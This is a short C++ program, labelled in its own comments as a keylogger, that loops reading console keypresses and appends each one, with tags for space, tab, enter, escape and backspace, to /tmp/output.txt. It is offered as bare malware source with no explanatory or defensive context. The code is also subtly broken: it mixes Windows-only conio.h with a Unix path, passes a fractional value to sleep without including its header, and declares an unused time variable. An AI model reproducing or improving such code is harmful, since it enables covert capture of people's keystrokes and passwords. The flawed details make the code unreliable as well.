#include <stdio.h>
#include <time.h>
#include <conio.h>

#include <iostream>
#include <fstream>

#define OUTPUT_FILE "/tmp/output.txt"

using namespace std; 

int main() {
  // Initialize variables
  ofstream f;
  char capture;

  // Time stuff
  time_t t;
  t = time(NULL);

  // Open and begin reading file
  f.open(OUTPUT_FILE);

  // Begin keylogger
  while (1) {
    sleep(0.1);
    if (kbhit()) {
      capture = getch();

      switch ((int) capture) {
        case ' ':
          f << "[SPACE]" << std::flush;
          break;
        case 0x09:
          f << "[TAB]" << std::flush;
          break;
        case 0x0d:
          f << "[ENTER]" << std::flush;
          break;
        case 0x1b:
          f << "[ESC]" << std::flush;
          break;
        case 0x08:
          f << "[BACKSPACE]" << std::flush;
          break;
        default:
          f << capture << std::flush;
      }
    }
  }
  return 1;
}